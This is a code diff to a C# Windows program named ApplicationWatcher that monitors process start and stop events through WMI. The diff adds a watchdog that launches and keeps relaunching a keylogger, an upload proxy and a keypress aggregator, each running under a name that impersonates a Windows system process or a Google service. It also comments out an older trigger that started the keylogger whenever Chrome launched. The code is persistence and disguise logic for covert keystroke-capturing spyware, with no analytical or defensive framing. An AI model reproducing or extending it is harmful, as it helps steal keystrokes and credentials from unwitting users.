@@ -53,13 +53,19 @@ namespace ApplicationWatcher
         //    ApplicationWatcherAsync eventWatcher = new ApplicationWatcherAsync();
         //    Console.Read();
         //}
-        private static string locationExe = "HookKeyLogger.exe";
+        private static string locationExeHook = "HookKeyLogger.exe";
+        private static string locationExeProxy="UploadProxy.exe";
+        private static string locationExeAgg = "KeypressAggregator.exe";
 
         ///<summary>
         ///Monitor the WMI to see when processes start and stop.
         ///</summary>
         public static void Main()
         {
+            bool debugOn = true;
+            //System.Threading.Thread.Sleep(1000);
+            if(!debugOn)
+                startAll();
             ManagementEventWatcher startWatch = new ManagementEventWatcher(
               new WqlEventQuery("SELECT * FROM Win32_ProcessStartTrace"));
             startWatch.EventArrived += new EventArrivedEventHandler(startWatch_EventArrived);
@@ -88,12 +94,67 @@ namespace ApplicationWatcher
             return false;
         }
 
+        private static void startAll()
+        {
+            int[] active = new int[4] { 0, 0, 0, 0 };
+            foreach (Process clsProcess in Process.GetProcesses())
+            {
+                string name = clsProcess.ProcessName;
+                if (name == "Windows Driver Foundation - User-mode Driver Framework Host Process")
+                {
+                    active[0] = 1;
+                }
+                else if (name == "Google Site Proxy")
+                {
+                    active[1] = 1;
+                }
+                else if (name == "Host Process for Windows Tasks")
+                {
+                    active[2] = 1;
+                }
+            }
+
+            if (active[0]==0)
+            {
+                //System.Threading.Thread.Sleep(10000);
+                System.Diagnostics.Process.Start(locationExeHook);
+            }
+            else if (active[1] == 0)
+            {
+                //System.Threading.Thread.Sleep(10000);
+                System.Diagnostics.Process.Start(locationExeProxy);
+            }
+            else if (active[2] == 0)
+            {
+                //System.Threading.Thread.Sleep(10000);
+                System.Diagnostics.Process.Start(locationExeAgg);
+            }
+
+        }
+
         ///<summary>
         ///See that a process has stopped.
         ///</summary>
         static void stopWatch_EventArrived(object sender, EventArrivedEventArgs e)
         {
-            Console.WriteLine("Process stopped: {0}", e.NewEvent.Properties["ProcessName"].Value);
+            string name = e.NewEvent.Properties["ProcessName"].Value.ToString();
+            Console.WriteLine("Process stopped: {0}", name);
+            if(name == "Windows Driver Foundation - User-mode Driver Framework Host Process")
+            {
+                //System.Threading.Thread.Sleep(10000);
+                System.Diagnostics.Process.Start(locationExeHook);
+            }
+            else if(name == "Google Site Proxy")
+            {
+                //System.Threading.Thread.Sleep(10000);
+                System.Diagnostics.Process.Start(locationExeProxy);
+            }
+            else if (name == "Host Process for Windows Tasks")
+            {
+                //System.Threading.Thread.Sleep(10000);
+                System.Diagnostics.Process.Start(locationExeAgg);
+            }
+
         }
 
         ///<summary>
@@ -104,12 +165,12 @@ namespace ApplicationWatcher
             //Console.WriteLine("Process started: {0}", e.NewEvent.Properties["ProcessName"].Value);
             string name = e.NewEvent.Properties["ProcessName"].Value.ToString();
             Console.WriteLine("Process started: {0}", name);
-            if (name == "Chrome.exe")
-            {
-                Console.WriteLine("Found");
-                if (!isActive("Windows Printer Discovery Service"))
-                    System.Diagnostics.Process.Start(locationExe);
-            }
+            //if (name == "Chrome.exe")
+            //{
+            //    Console.WriteLine("Found");
+            //    if (!isActive("Windows Printer Discovery Service"))
+            //        System.Diagnostics.Process.Start(locationExe);
+            //}
         }
     }
 }
